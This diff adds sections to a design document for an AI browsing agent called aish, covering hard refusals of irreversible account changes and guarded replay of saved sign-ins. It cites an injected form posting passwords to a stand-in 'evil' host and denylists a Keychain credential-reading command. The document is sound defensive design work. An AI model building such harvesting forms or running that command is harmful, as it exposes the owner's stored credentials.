@@ -335,6 +335,72 @@ Two things bound the change. The word list still runs, so a GET form whose butto
 
 **A password field is refused outright and never draws a card.** aish types the owner's credentials nowhere, and this is the last door that could have started. There is no yes that makes it a good idea, and offering one would teach him there is — he is handed `/browser <host>` instead, which is the same answer the whole feature gives.
 
+**And a handful of CONSEQUENCES are refused the same way (#278).** The password refusal was the only unapprovable act here for a year; it is now the shape four more take. aish will never change the e-mail or phone on an account, change a payout address, change a password or PIN, or close an account — on any site, however it is asked.
+
+The reason it is structural rather than a card is the owner's own constraint, stated plainly: *"there's this decision fatigue if I have to please click approve for every action. It's not gonna happen."* A card he taps blind is **worse** than no card, because it converts a missing control into a *recorded consent* — the trace then says he approved it. So the only control that survives him not reading cards is one that removes a decision instead of adding one. It is also R1-shaped: a false positive over-restricts loudly and can never under-restrict.
+
+**This is not a bigger `_MUTATING_WORDS`, and the asymmetry is why.** That list is deliberately broad and dumb because a false positive there costs a prompt. A false positive HERE removes a capability outright with no way to grant it back in the moment, so `irreversible()` is deliberately narrow: a contact or payout match needs a change **verb** and the thing being changed, adjacent in one label. A bare *e-mail* is half the nav bars on the Polish web and matches nothing.
+
+**Deliberately account-scoped, and this is where the plan was narrowed on purpose.** Blanket *delete* stays a card. Making every delete unapprovable would stop aish throwing away a draft, a reminder or one message — far more capability than it protects, because a delete on a page is nearly always a row and not an account. Blanket destruction is a **reversibility** problem (a trash that empties later, #177), not a consequence class, and it wants that mechanism instead of this one.
+
+**One check reads a value rather than a label, and it is the stronger half.** `types_a_bank_account` refuses an IBAN-shaped value wherever a batch types it, with no reference to what the field is called. Every other test here reads a LABEL — which the page writes, and can therefore lie about; this one reads what aish is about to **send**, which it cannot. There is no task where aish typing an account number into a form is the answer: a payment is made by him, and a payout address is precisely what an injection would want changed. It is checked on the whole batch before any of it runs and before the card is composed, so a refused batch has typed nothing and left nothing half-sent.
+
+The escape hatch is the one the password refusal already established, and it is why none of this is a wall: he is handed `/browser <host>` and does it himself. The capability is not removed from HIM, only from aish's hands. `TestConsequencesWithNoYesButton`.
+
+## Signing in again as him (#280)
+
+eon.pl expires its session in about fifteen minutes, so the persistent profile — the thing this whole feature rests on — buys nothing there, and the only repair was him picking up his phone and signing in by hand. That means he did the hard part. `signin.py` holds the store, `browser.sign_in` the replay, `web._browser_read` the one seam that uses it.
+
+**The invariant is not "no code in aish types a password".** The remote view already types his, from his own hands. It is: *the model is never in the credential loop, and a credential never enters model context, tool arguments, logs or traces.* Nothing here is a tool, nothing takes a model-supplied argument, and the model cannot ask for a sign-in, name a host to sign into, see the value, or see the fields. What it gets back is a page that was already readable.
+
+### Three fences, and the third is the one an earlier draft got wrong
+
+**The origin is compared EXACTLY** — scheme, host and port. Deliberately *not* `is_logged_in`'s dot-boundary suffix match: that one is lenient because gating too much is its safe direction, and reusing it here would fire the credential at any subdomain an attacker can raise. A live page that has redirected elsewhere — an identity provider, `about:blank` — stops before the form is even read.
+
+**The login URL is stored, and it is a fence rather than bookkeeping.** Without it the replay rule degrades to *"type the credential wherever a password field appears on this host"*, so any injected form on the origin harvests it. aish types the credential only at the page he recorded, reached by its own top-level navigation.
+
+**The form's DESTINATION is checked, not just the page's origin.** This is the hole an earlier draft had, and it leaked the credential outright: page origin says nothing about where a form SENDS. Any same-origin page that can render markup — a user-content path, a comment field, an on-origin open redirect — could carry `<form action="https://evil/collect">` and be handed the live password with every stated fence satisfied. So the form must POST, and post to the same origin. **The POST half is not cosmetic either:** a GET login puts the password in the query string, and `remember_page` then writes that URL into `recent.json` in cleartext, outside every scrubbing path there is.
+
+Also required: exactly one visible password field, in the main frame. A login form inside a *cross-origin* iframe is a different origin and must be refused anyway; a same-origin one is a known gap, refused with a reason rather than guessed at.
+
+### One attempt, never a retry
+
+The form coming back is the site refusing the credential, and it is the **only** outcome that marks it stale. Retrying a wrong password is how accounts lock, and unattended it locks them silently. A stale record answers `credential()` with `None` — the value that must not be spent again — while the record itself survives so `/browser` can explain why. A fresh capture clears it.
+
+**A second factor is not a failure**, and telling them apart matters: the password was almost certainly right, so recording it as stale would burn a good credential and send him back to a full sign-in. It ends as a hand-off — the note names `/browser <host>`, and the push says the site wants a code.
+
+### Capture: at the hand sign-in he already does
+
+No "add a password" screen. The password editor in the remote view grows one checkbox, default off, shown only on a password field. **Flipping it is what lets aish hold the value at all** — the remote-view input path retains nothing by default, and this is the one bounded exception, dropped when the view ends and never logged or traced.
+
+**Consent is sticky for the origin, for the life of the view, and that is the retry.** A first attempt with the box ticked fails, the editor reopens with the box back at its default off, he types the correct password — and it would be dropped, so the one attempt that actually worked is the one aish forgot to keep. Sticky consent makes the checkbox a statement about this sign-in rather than about one keystroke.
+
+**The identifier is captured too**, because a password alone re-establishes nothing and in a two-step flow it was typed on a page that no longer exists. Reading an ordinary field back is allowed where reading a password is not — the frame already ships everything visible, so it is no new exposure — and `TestPasswordsAreNeverReadBack` is untouched.
+
+**Nothing is written until the sign-in is seen to work, and the success test had to be fixed first.** It was `navigations > pending_nav`, unbounded in time and cleared only when it fires — so a failed login redirecting back to the form counts, and so does a reload, a Back, or him browsing somewhere else twenty minutes later. That was tolerable while it only *asked a human a question they could dismiss*; it is not tolerable now that it also decides whether a password is written. It now also requires that the page is no longer asking for one. Same shape as the `_note_visit` lesson: a heuristic that is fine as a question becomes a false statement as a record.
+
+### Never silent, and the receipt is not a widget
+
+A credential use emits the provenance note above the untrusted-content banner (`RENEWED_SESSION_NOTE`), records itself in the store's counters, and **pushes**. A push is the right channel precisely because it demands no decision — he has said he will not read a card per action, and he is right that a card tapped blind is worse than none, since it records a consent he never gave. It is rare by construction: once per lapse, not once per act.
+
+The save receipt is a plain toast, not an Undo button. The way back already exists as `/browser forget <host>`, shared by the CLI and the web — an action slot on the toast would be a new widget standing in for a door that is already open, which is the mistake rule 4 names first.
+
+### What `/browser` says, and what it refuses to claim
+
+`forget` now takes **all of it**: the login record and the saved sign-in. It cannot take the live session — that is his to end, at the site — so it says so rather than implying otherwise.
+
+The listing reports what the store actually owns: when it was saved, how often it has been used, and whether it stopped working. It deliberately does **not** claim whether he is signed in right now. Cookie presence is not session validity — eon.pl expires server-side in about fifteen minutes — and actually proving it would cost a Chrome launch and a navigation *per row* on a box that evicts Chrome for memory. A row that lies is the failure #236 was about; a row that says less is not.
+
+### The Keychain is its own namespace, and the shell cannot read it
+
+Sign-ins live under `aish-signin`, never the `aish` service. Two things resolve a name against that one — a plugin manifest's `secrets:` field and `aish secret get` — and a site credential must be reachable by neither. And `security find-generic-password -s aish …` is now on the **denylist**: everything else there is unrecoverable, while this one is unapprovable for the other reason a command can be — it would put the owner's stored passwords into the model's context, which every fence here exists to prevent, on a card he has said he will tap through. The denylist already sees through `sh -c`, `env` and `&&`.
+
+Stored passwords are also scrubbed from tool output like every other secret, which covers the login page that echoes a failed password back into its own error text.
+
+The store reads defensively for the reason every reader here does: a corrupt `signins.json` must cost the sign-ins, never the browser. A missing or unparseable file reads as empty and a row missing its origin or its login URL is dropped, because a half-record is exactly the one that would replay somewhere it should not. `TestTheStoreNeverThrowsIntoARead`.
+
+`TestAnOriginIsMatchedExactly`, `TestWhatIsStoredAndWhatIsNot`, `TestOneAttemptNeverARetry`, `TestTheKeychainIsNotReadableThroughTheShell`, `TestTheReplayItself`.
+
 With no approver it fails closed, like the login gate. The echo line is not decoration either: the owner grants a host once and then watches a flow go past, so `→ browse: click button 'Przełącz lokal'` is his only running account of what aish is doing inside his account. `TestBrowseGate` pins all of it.
 
 Two fences worth keeping: browse is **not** in `READ_ONLY_TOOLS`, so it never rides the parallel read path — one page, one session, one action at a time, or two clicks land on one document in an order nobody chose. And `web.browse` keeps the same SSRF fence as `read_url`: a driven page is still a model-chosen URL, and this one can click.
